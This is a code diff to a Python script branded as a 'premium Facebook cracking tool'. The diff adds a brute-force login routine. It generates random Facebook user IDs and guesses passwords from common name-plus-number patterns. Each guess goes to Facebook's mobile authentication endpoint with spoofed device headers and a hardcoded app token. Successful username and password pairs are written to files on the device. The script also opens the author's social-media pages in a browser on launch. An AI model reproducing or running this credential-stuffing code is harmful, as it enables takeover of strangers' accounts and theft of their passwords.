@@ -411,6 +411,86 @@ print("iPhone UA:", get_iphone_ua()[:80] + "...")
 print(f"\nTotal UAs: {len(ugen)}")
 print("To save: save_to_file()")
 
+try:
+    if platform.system() == "Linux":
+        os.system(
+            'xdg-open https://www.facebook.com/profile.php?id=100004682100211')
+        os.system('xdg-open https://wa.me/923079741690')
+    elif platform.system() == "Windows":
+        os.system(
+            'start https://www.facebook.com/profile.php?id=100004682100211')
+        os.system('start https://wa.me/923079741690')
+    elif platform.system() == "Darwin":
+        os.system(
+            'open https://www.facebook.com/profile.php?id=100004682100211')
+        os.system('open https://wa.me/923079741690')
+except: 
+    pass
+	    
+def linex():
+    print(f'\r\x1b[38;5;46m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
+
+
+def line():
+    print(f'\r\n\x1b[38;5;46m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
+
+
+
+logo = f"""
+\x1b[38;5;46m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
+\x1b[38;5;46m║                                           ║
+\x1b[38;5;46m║    ███╗░░░███╗░█████╗░░█████╗░███████╗    ║
+\x1b[38;5;46m║    ████╗░████║██╔══██╗██╔══██╗╚════██║    ║
+\x1b[38;5;46m║    ██╔████╔██║███████║███████║░░███╔═╝    ║
+\x1b[38;5;46m║    ██║╚██╔╝██║██╔══██║██╔══██║██╔══╝░░    ║
+\x1b[38;5;46m║    ██║░╚═╝░██║██║░░██║██║░░██║███████╗    ║
+\x1b[38;5;46m║    ╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝╚══════╝    ║
+\x1b[38;5;46m║                                           ║
+\x1b[38;5;46m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
+
+\x1b[38;5;46m╔═══════════════════════════════════════════╗
+\x1b[38;5;46m║     \033[1;97m[ PREMIUM FACEBOOK CRACKING TOOL ]     \x1b[38;5;46m║
+\x1b[38;5;46m╚═══════════════════════════════════════════╝
+
+\x1b[38;5;46m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+\x1b[38;5;46m[\033[1;97m✅\x1b[38;5;46m] \033[1;97mDEVELOPER   \x1b[38;5;46m▶  \033[1;97mMohammad MAAZ
+\x1b[38;5;46m[\033[1;97m✅\x1b[38;5;46m] \033[1;97mWHATSAPP    \x1b[38;5;46m▶  \033[1;97m+923079741690
+\x1b[38;5;46m[\033[1;97m✅\x1b[38;5;46m] \033[1;97mFEATURE     \x1b[38;5;46m▶  \033[1;97mOLD FACEBOOK CLONE
+\x1b[38;5;46m[\033[1;97m✅\x1b[38;5;46m] \033[1;97mVERSION     \x1b[38;5;46m▶  \033[1;97mv2.7 PREMIUM
+\x1b[38;5;46m[\033[1;97m✅\x1b[38;5;46m] \033[1;97mSTATUS      \x1b[38;5;46m▶  \033[1;97mFULLY WORKING ✓
+\x1b[38;5;46m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""
+
+
+def clear():
+    os.system('clear')
+    print(logo)
+
+
+def main():
+    clear()
+    os.system('espeak -a 300 "Welcome to MAAZ tools"')
+
+    animation = [
+        "[\x1b[38;5;46m■\033[1;97m□□□□□□□□□]",
+        "[\x1b[38;5;46m■■\033[1;97m□□□□□□□□]",
+        "[\x1b[38;5;46m■■■\033[1;97m□□□□□□□]",
+        "[\x1b[38;5;46m■■■■\033[1;97m□□□□□□]",
+        "[\x1b[38;5;46m■■■■■\033[1;97m□□□□□]",
+        "[\x1b[38;5;46m■■■■■■\033[1;97m□□□□]",
+        "[\x1b[38;5;46m■■■■■■■\033[1;97m□□□]",
+        "[\x1b[38;5;46m■■■■■■■■\033[1;97m□□]",
+        "[\x1b[38;5;46m■■■■■■■■■\033[1;97m□]",
+        "[\x1b[38;5;46m■■■■■■■■■■\033[1;97m]"
+    ]
+
+    for i in range(30):
+        time.sleep(0.1)
+        sys.stdout.write(
+            f"\r\x1b[38;5;46m[\033[1;97mᯤ\x1b[38;5;46m] \x1b[38;5;46mLOADING...\033[1;97m "
+            + animation[i % len(animation)] + "\033[1;97m ")
+        sys.stdout.flush()
+
+    clear()
 
 def clear():
     os.system('clear')
@@ -424,6 +504,14 @@ def line():
 # Global variables for results
 oks = []
 cps = []
+loop = 0
+
+# User agent list (add your user agents here)
+ugen = [
+    "Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 11; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
+    "Mozilla/5.0 (Linux; Android 13; RMX3571) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
+]
 
 def main():
     clear()
@@ -494,7 +582,7 @@ def START_SERIES_CLONING(series_code):
             data = ''.join(random.choice(string.digits) for _ in range(11))
         else:
             # For 6155, 6156, 6157 series - 11 more digits  
-            data = ''.join(random.choice(string.digits) for _ in range(11))
+            data = ''.join(random.choice(string.digits) for _ in range(10))
         
         uid = series_code + data
         user.append(uid)
@@ -505,9 +593,13 @@ def START_SERIES_CLONING(series_code):
         print(f'\x1b[38;5;46m[\033[1;97m✅\x1b[38;5;46m] \033[1;97mSERIES CODE \x1b[38;5;46m▶ \033[1;97m{series_code}')
         print(f'\x1b[38;5;46m[\033[1;97m✅\x1b[38;5;46m] \033[1;97mUSED AIRPLANE MODE AFTER 5 MINUTE')
         linex()
+        # Generate random name for password guessing
+        names = ["ali", "ahmed", "hassan", "khan", "malik", "shah", "user", "admin"]
+        random_name = random.choice(names)
+        
         for mal in user:
             uid = mal
-            jihad.submit(login1, uid)
+            jihad.submit(login1, uid, random_name)
     
     line()
     print(f'\r\x1b[38;5;46m[\033[1;97m✅\x1b[38;5;46m] \033[1;97mYOUR SERIES CRACKED HAS BEEN COMPLETED...\x1b[38;5;46m!')
@@ -515,5 +607,109 @@ def START_SERIES_CLONING(series_code):
     print(f"\r\r\r\r\x1b[38;5;46m[\033[1;97mᯤ\x1b[38;5;46m] \033[1;97mTOTAL OK \x1b[38;5;46m▶ \x1b[38;5;46m{len(oks)}")
     linex()
     input(f'\x1b[38;5;46m[\033[1;97mᯤ\x1b[38;5;46m] \033[1;97mINTER TO BACK RAN AGAIN...\x1b[38;5;46m!\033[1;37m')
+    main()
+
+# Password generator with guessing logic
+def generate_passwords(name):
+    base_name = name.lower().replace(" ", "")
+    patterns = ["123", "786", "1122", "12345", "khan", "khan786", "@123"]
+
+    passwords = [f"{base_name}{p}" for p in patterns]  # Name-based
+    passwords.append(base_name + str(random.randint(100, 999)))  # Random number
+    passwords.append(base_name[:3] + str(random.randint(1000, 9999)))  # Short name + number
+    
+    # Guessing logic
+    reversed_name = base_name[::-1]
+    initials = "".join([part[0] for part in base_name.split() if part])
+    passwords.append(reversed_name + "123")
+    passwords.append(initials + "786")
+    passwords.append(initials + str(random.randint(1000, 9999)))
+
+    return list(set(passwords))  # Remove duplicates
+
+# Updated login function with password guessing
+def login1(uid, name="user"):
+    global oks, loop, cps
+    Session = requests.session()
+    try:
+        sys.stdout.write(
+            f'\r\r\x1b[38;5;46m[\x1b[38;5;46mMaaz\x1b[38;5;46m-\x1b[38;5;46mB1\x1b[38;5;46m]\033[1;97m-\x1b[38;5;46m[\033[1;97m{loop}\x1b[38;5;46m]\033[1;97m-\x1b[38;5;46m[\x1b[38;5;46mOK\x1b[38;5;46m/\x1b[38;5;226mCP\x1b[38;5;46m]\033[1;97m-\x1b[38;5;46m[\x1b[38;5;46m{len(oks)}\x1b[38;5;46m/\x1b[38;5;46m{len(cps)}\x1b[38;5;46m]'
+        )
+        sys.stdout.flush()
+        ua = random.choice(ugen)
+
+        # Generate passwords dynamically from name
+        for pw in generate_passwords(name):
+            data = {
+                'adid': str(uuid.uuid4()),
+                'format': 'json',
+                'device_id': str(uuid.uuid4()),
+                'cpl': 'true',
+                'family_device_id': str(uuid.uuid4()),
+                'credentials_type': 'device_based_login_password',
+                'error_detail_type': 'button_with_disabled',
+                'source': 'device_based_login',
+                'email': str(uid),
+                'password': str(pw),
+                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
+                'generate_session_cookies': '1',
+                'meta_inf_fbmeta': '',
+                'advertiser_id': str(uuid.uuid4()),
+                'currently_logged_in_userid': '0',
+                'locale': 'en_US',
+                'client_country_code': 'US',
+                'method': 'auth.login',
+                'fb_api_req_friendly_name': 'authenticate',
+                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
+                'api_key': '882a8490361da98702bf97a021ddc14d'
+            }
+            head = {
+                'User-Agent': ua,
+                'Content-Type': 'application/x-www-form-urlencoded',
+                'Host': 'graph.facebook.com',
+                'X-FB-Net-HNI': str(random.randint(20000, 30000)),
+                'X-FB-SIM-HNI': str(random.randint(29000, 40000)),
+                'X-FB-Connection-Type': random.choice(['MOBILE.LTE', 'WIFI', 'MOBILE.3G', 'MOBILE.4G']),
+                'X-Tigon-Is-Retry': 'False',
+                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
+                'x-fb-device-group': str(random.randint(5000, 6000)),
+                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
+                'X-FB-Request-Analytics-Tags': 'graphservice',
+                'X-FB-HTTP-Engine': 'Liger',
+                'X-FB-Client-IP': 'True',
+                'X-FB-Server-Cluster': 'True',
+                'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',
+                'Content-Length': '706'
+            }
+            url = "https://b-graph.facebook.com/auth/login"
+            try:
+                rp = requests.post(url,
+                                   data=data,
+                                   headers=head,
+                                   allow_redirects=False,
+                                   verify=True).json()
+                if "session_key" in rp:
+                    oks.append(uid)
+                    open("/sdcard/OLD_CLONING-OK.txt", "a").write(uid + "|" + pw + "\n")
+                    print(f'\r\033[38;5;46m[MAAZ-OK] {uid} ● {pw}\033[1;97m')
+                    os.system('espeak -a 300 "OK ID Found"')
+                    break
+
+                elif "www.facebook.com" in rp.get('error', {}).get('message', ''):
+                    cps.append(uid)
+                    open("/sdcard/OLD_CLONING-CP.txt", "a").write(uid + "|" + pw + "\n")
+                    print(f'\r\033[38;5;226m[MAAZ-CP] {uid} ● {pw}\033[1;97m')
+                    os.system('espeak -a 300 "Checkpoint ID"')
+                    break
+                else:
+                    continue
+            except:
+                continue
+        loop += 1
+    except Exception as e:
+        time.sleep(30)
+
+# Run the program
+if __name__ == "__main__":
     main()
 
